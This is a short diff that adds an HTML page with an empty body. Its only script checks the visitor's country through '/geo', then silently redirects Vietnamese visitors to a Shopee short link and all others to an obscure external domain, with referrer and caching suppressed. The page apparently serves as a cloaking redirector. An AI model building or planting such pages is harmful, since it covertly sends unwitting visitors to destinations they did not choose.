@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-store">
+
+<script>
+(function(){
+  const SHOPEE = "https://s.shopee.vn/1gCNpeNd9F";
+  const EXT    = "https://broadlyjukeboxunrevised.com/2058173";
+
+  fetch("/geo", { cache: "no-store" })
+    .then(r => r.text())
+    .then(c => {
+      c = c.trim().toUpperCase();
+      location.replace(c === "VN" ? SHOPEE : EXT);
+    })
+    .catch(() => location.replace(EXT));
+})();
+</script>
+</head>
+<body></body>
+</html>
